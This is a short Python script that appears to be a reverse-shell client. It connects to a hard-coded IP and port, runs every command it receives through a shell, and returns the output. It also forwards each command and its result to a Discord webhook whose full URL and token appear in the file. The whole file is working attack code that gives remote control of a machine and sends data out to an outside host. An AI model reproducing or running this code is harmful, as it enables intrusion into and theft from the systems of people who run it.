import socket
import subprocess
import requests

def send_to_discord(command, response):
    # Discord webhook URL
    webhook_url = "https://discord.com/api/webhooks/1380241373277589647/xu112TCkitkpNqkQMiQu5asieAlwmzncR9CXNu8SQKkB_aIGwPiCxEnxHXjmC2-A9Hej"
    # Prepare the message
    data = {
        "content": f"**Command:** `{command}`\n**Response:**\n```{response}```"
    }
    
    try:
        # Send the data to Discord webhook
        result = requests.post(webhook_url, json=data)
        if result.status_code == 204:
            print("Successfully sent to Discord webhook")
        else:
            print(f"Failed to send to Discord webhook: {result.status_code}")
    except Exception as e:
        print(f"Error sending to Discord webhook: {e}")

def start_client():
    # Create a socket object
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = '192.168.1.5'  # Replace with the server's IP address
    port = 12345           # Same port as the server

    try:
        # Connect to the server
        client_socket.connect((host, port))
        print(f"Connected to server at {host}:{port}")

        while True:
            # Receive command from the server
            command = client_socket.recv(4096).decode('utf-8')
            if not command:
                break

            print(f"Received command: {command}")

            try:
                # Execute the command using subprocess
                result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
                response = result.stdout if result.stdout else result.stderr
                if not response:
                    response = "Command executed successfully, no output."
            except subprocess.TimeoutExpired:
                response = "Error: Command execution timed out"
            except Exception as e:
                response = f"Error executing command: {str(e)}"

            # Send response back to the server
            client_socket.send(response.encode('utf-8'))

            # Send command and response to Discord webhook
            send_to_discord(command, response)

    except Exception as e:
        print(f"Error: {e}")
    finally:
        # Close the socket
        client_socket.close()
        print("Connection closed.")

if __name__ == "__main__":
    start_client()